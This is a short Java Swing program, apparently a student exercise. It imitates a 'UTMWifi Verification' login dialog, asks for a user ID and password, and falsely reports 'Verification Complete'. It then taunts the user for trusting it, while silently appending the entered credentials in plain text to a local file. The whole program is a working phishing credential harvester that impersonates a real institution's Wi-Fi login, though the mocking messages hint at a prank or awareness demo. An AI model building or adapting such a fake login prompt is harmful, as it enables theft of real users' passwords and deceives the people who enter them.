/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package password;

import javax.swing.JOptionPane;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;

/**
 *
 * @author user
 */
public class Password {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws IOException {
        JOptionPane jop = new JOptionPane();
        jop.showMessageDialog(null, "MPK8 UTMWifi Verification");

        String name = jop.showInputDialog("UTMID: ");
        String password = jop.showInputDialog("Password: ");
        jop.showMessageDialog(null, "Verification Complete");

        jop.showMessageDialog(null, "Never submit your password blindly bruh.\nI hope you didn't inserted the legit one.. right?");
        jop.showMessageDialog(null, "Anyway bye");

        File file = new File("C:\\OOP PASS\\append.txt");
        FileWriter fr = new FileWriter(file, true);
        BufferedWriter br = new BufferedWriter(fr);
        PrintWriter pr = new PrintWriter(br);
        pr.println(name + " " + password);
        pr.close();
        br.close();
        fr.close();

        // TODO code application logic here
    }

}
